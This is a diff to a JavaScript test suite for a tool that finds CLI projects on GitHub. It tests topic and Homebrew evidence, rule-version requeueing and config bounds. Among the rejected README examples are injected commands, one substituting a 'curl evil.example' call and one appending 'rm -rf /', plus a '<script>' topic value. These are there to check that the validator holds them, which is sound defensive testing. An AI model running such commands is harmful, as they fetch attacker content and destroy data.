@@ -4,6 +4,7 @@ import { readFile } from 'node:fs/promises';
 import { packageCommands, formulaCommands, evaluateCandidate, remainingToday, validateConfig } from './lib/cli-evidence.mjs';
 import { brewCandidates, createClient, discover, SourceTooLargeError, BudgetPause } from './discover-clis.mjs';
 import { dispatchDiscovery } from '../workers/discovery/index.mjs';
+import { categories } from '../src/data/tools.ts';
 
 const config = JSON.parse(await readFile(new URL('../discovery/config.json', import.meta.url)));
 const repo = { name: 'query-cli', full_name: 'sample/query-cli', html_url: 'https://github.com/sample/query-cli', description: 'A command-line tool for querying JSON files', stargazers_count: 500, default_branch: 'main' };
@@ -38,6 +39,8 @@ test('Popularity alone cannot admit a library, GUI launcher, unsupported command
     '`npm install -g query-cli`\n`query $(curl evil.example)`',
     '`npm install -g query-cli`\n`query data.json; rm -rf /`',
     '`npm install -g query-cli`\n`query <FILE>`',
+    '`npm install -g query-cli`\n`query is a fast tool for data`',
+    '`npm install -g query-cli`\n`query the files you need`',
   ]) assert.equal(evaluate({ docs: [{ ...docs[0], text }] }).status, 'held', text);
   const result = evaluate();
   assert.equal(result.entry.example, 'query data.json');
@@ -251,4 +254,70 @@ test('End-to-end discovery pins evidence, preserves editorial data, obeys rerun 
   assert.deepEqual(exhausted.catalog, catalog);
   const collectionPaused = await discover({ ...input, request: async () => { throw new BudgetPause('Budget low'); } });
   assert.deepEqual(collectionPaused.state, state, 'Incomplete source collection must not advance source cursors');
+});
+
+test('CLI identity comes from topics or Homebrew as well as wording, and unclassified terminal work still lists', () => {
+  const quiet = { ...repo, description: 'Fast static analysis for GitHub Actions workflows' };
+  assert.equal(evaluate({ repo: quiet }).reason, 'No CLI evidence in description, topics, or Homebrew');
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['cli', 'linter'] } }).status, 'accepted');
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['terminal'] } }).status, 'accepted');
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['machine-learning'] } }).status, 'held');
+  assert.equal(evaluate({ repo: { ...quiet, topics: 'cli' } }).status, 'held', 'Topics must be a list of labels');
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['<script>'] } }).status, 'held');
+  const brewOnly = { ...quiet, stargazers_count: 2 };
+  assert.equal(evaluate({ repo: brewOnly, brew: { repo: repo.full_name, count: 100 } }).status, 'accepted');
+  // Wording that identifies a CLI but matches no category is listed, not discarded.
+  const unclassified = { ...repo, description: 'A command-line stopwatch for focused work' };
+  assert.equal(evaluate({ repo: unclassified }).entry.category, 'Terminal utilities');
+  assert.ok(categories.includes(evaluate({ repo: unclassified }).entry.category), 'The fallback category is filterable on the site');
+  // Topics classify as well as descriptions do.
+  assert.equal(evaluate({ repo: { ...unclassified, topics: ['kubernetes'] } }).entry.category, 'Cloud & deployment');
+  // Neither route weakens the library, GUI, or evidence checks.
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['cli'], description: 'A command-line launcher for a desktop editor' } }).status, 'held');
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['cli'] }, declarations: [] }).status, 'held');
+  assert.equal(evaluate({ repo: { ...quiet, topics: ['cli'], description: 'short' } }).reason, 'Description is missing or unusable');
+});
+
+test('Rule changes requeue held candidates while current holds keep their recheck window', async () => {
+  const request = async url => {
+    if (url.includes('/search/repositories?')) return { items: [repo], incomplete_results: false };
+    if (url.includes('/analytics/')) return { category: 'formula_install_on_request', end_date: '2026-09-09', formulae: {} };
+    if (url.endsWith('/repos/sample/query-cli')) return repo;
+    if (url.includes('/commits/')) return { sha: 'b'.repeat(40) };
+    if (url.includes('/git/trees/')) return { tree: [{ type: 'blob', mode: '100644', path: 'package.json', size: 100, sha: 'package.json' }, { type: 'blob', mode: '100644', path: 'README.md', size: 100, sha: 'README.md' }, { type: 'blob', mode: '100644', path: 'cli.js', size: 10, sha: 'cli.js' }] };
+    const body = { 'package.json': JSON.stringify({ name: 'query-cli', bin: { query: 'cli.js' } }), 'README.md': docs[0].text }[url.split('/git/blobs/')[1]];
+    if (body) return { encoding: 'base64', content: Buffer.from(body).toString('base64') };
+    throw new Error(`Unexpected request ${url}`);
+  };
+  const held = checkedAt => ({ version: 1, searchPage: 1, brewOffset: 0, candidates: { 'sample/query-cli': { status: 'held', checkedAt, rulesVersion: config.rulesVersion, reason: 'Superseded reason' } } });
+  const input = { catalog: [], mappings: {}, config, request, now: '2026-09-09T12:00:00Z' };
+  assert.equal((await discover({ ...input, state: held('2026-09-08T12:00:00Z') })).accepted.length, 0, 'A current hold waits out its window');
+  const superseded = held('2026-09-08T12:00:00Z');
+  superseded.candidates['sample/query-cli'].rulesVersion = config.rulesVersion - 1;
+  const requeued = await discover({ ...input, state: superseded });
+  assert.equal(requeued.accepted.length, 1, 'A hold recorded under older rules is judged again at once');
+  assert.equal(requeued.state.candidates['sample/query-cli'].rulesVersion, config.rulesVersion);
+  const unversioned = held('2026-09-08T12:00:00Z');
+  delete unversioned.candidates['sample/query-cli'].rulesVersion;
+  assert.equal((await discover({ ...input, state: unversioned })).accepted.length, 1, 'Holds predating rule versioning are judged again too');
+  const rejected = held('2026-09-08T12:00:00Z');
+  Object.assign(rejected.candidates['sample/query-cli'], { status: 'rejected', rulesVersion: config.rulesVersion - 1 });
+  assert.equal((await discover({ ...input, state: rejected })).accepted.length, 0, 'Rule changes never revive an editorial rejection');
+});
+
+test('Discovery configuration bounds the query set, the rules version, and the durable queue', async () => {
+  assert.doesNotThrow(() => validateConfig(config));
+  assert.throws(() => validateConfig({ ...config, rulesVersion: 0 }));
+  assert.throws(() => validateConfig({ ...config, rulesVersion: undefined }));
+  assert.throws(() => validateConfig({ ...config, queries: Array.from({ length: 25 }, () => 'topic:cli') }));
+  // Star-sliced queries keep their own floor; unsliced ones still get the configured one.
+  const queries = [];
+  const request = async url => {
+    if (url.includes('/search/repositories?')) { queries.push(decodeURIComponent(new URL(url).searchParams.get('q'))); return { items: Array.from({ length: 100 }, (_, i) => ({ full_name: `sample/tool-${queries.length}-${i}` })), incomplete_results: false }; }
+    if (url.includes('/analytics/')) return { category: 'formula_install_on_request', end_date: '2026-09-09', formulae: {} };
+    return { stargazers_count: 0, full_name: 'sample/unused', html_url: 'https://github.com/sample/unused', description: 'A library', name: 'unused' };
+  };
+  const result = await discover({ catalog: [], mappings: {}, config: { ...config, queries: ['topic:cli stars:500..999', 'topic:terminal'] }, state: { version: 1, searchPage: 1, brewOffset: 0, candidates: {} }, request, now: '2026-09-09T12:00:00Z' });
+  assert.deepEqual(queries, ['topic:cli stars:500..999 archived:false fork:false', `topic:terminal stars:>=${config.minStars} archived:false fork:false`]);
+  assert.ok(result.state.pending.length <= 900, 'The stored queue stays inside its validated bound');
 });
